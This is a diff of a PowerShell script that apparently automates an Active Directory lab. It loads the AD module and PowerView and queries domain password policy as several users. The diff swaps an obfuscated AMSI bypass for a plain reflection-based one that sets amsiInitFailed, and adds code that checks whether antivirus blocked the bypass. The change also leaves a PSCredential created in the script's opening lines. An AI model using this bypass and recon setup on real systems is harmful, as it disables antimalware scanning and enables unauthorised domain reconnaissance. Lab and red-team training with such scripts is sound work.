@@ -9,6 +9,7 @@ $credential_admin = New-Object System.Management.Automation.PSCredential("robert
 $AD_Module_session = New-PSSession -Name "ADModule"
 $PV_Session = New-PSSession -Name "PowerView"
 
+# Run commands in the ADModule session using Invoke-Command
 Invoke-Command -Session $AD_Module_session -ScriptBlock {
     # Set Execution Policy to unrestricted
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
@@ -19,7 +20,7 @@ Invoke-Command -Session $AD_Module_session -ScriptBlock {
     Import-Module ./ADModule/Microsoft.ActiveDirectory.Management.dll -Verbose -ErrorAction Stop
     Import-Module ./ADModule/ActiveDirectory/ActiveDirectory.psd1 -Verbose -ErrorAction Stop
 
-    # Get-ADDomain
+    # Verify AD Module installation with Get-ADDomain
     try {
         Write-Output "Verifying AD module installation with Get-ADDomain..."
         Get-ADDomain -ErrorAction Stop
@@ -30,17 +31,36 @@ Invoke-Command -Session $AD_Module_session -ScriptBlock {
 
 # Run commands in the PowerView session
 Invoke-Command -Session $PV_Session -ScriptBlock {
-    # Set Execution Policy to Full Language Mode
+    # Set Execution Policy and Full Language Mode
     Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -ErrorAction Stop
     $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
     
     # AMSI Bypass
-    [Ref]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))
-
+    Write-Output "Attempting AMSI bypass..."
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
+    
+    $output = try {
+        amsiInitFailed
+    } catch {
+        $_.Exception.Message
+    }
+    
+    # Check the output for specific error messages
+    if ($output -match "is not recognized as the name of a cmdlet") {
+        Write-Output "AMSI bypass successful: 'amsiInitFailed' is not recognized."
+    } elseif ($output -match "has been blocked by your antivirus software") {
+        Write-Output "AMSI bypass failed: 'amsiInitFailed' command got blocked by antivirus."
+        exit 1  # Exit with an error code to signal failure
+    } else {
+        Write-Output "Unexpected output: $output"
+        exit 1  # Exit with an error code for unexpected result
+    }
+    
+    # Unblock and import PowerView module
     Unblock-File ./PowerView/PowerView.ps1 -ErrorAction Stop
     Import-Module ./PowerView/PowerView.ps1 -Verbose -ErrorAction Stop
     
-    # Get-Netdomain
+    # Verify PowerView installation with Get-NetDomain
     try {
         Write-Output "Verifying PowerView installation with Get-NetDomain..."
         Get-NetDomain -ErrorAction Stop
@@ -49,6 +69,7 @@ Invoke-Command -Session $PV_Session -ScriptBlock {
     }
 }
 
+# Run commands as `robb.stark`
 Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADModule as robb.stark"
 
 Invoke-Command -Session $AD_Module_session -ScriptBlock {
@@ -69,7 +90,8 @@ Invoke-Command -Session $PV_Session -ScriptBlock {
     }
 }
 
-Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADmodule as robb.stark"
+# Run commands as `robert.baratheon`
+Read-Host "Press Enter to run Get-ADDefaultDomainPasswordPolicy for ADModule as robert.baratheon"
 
 Invoke-Command -Session $AD_Module_session -ScriptBlock {
     try {
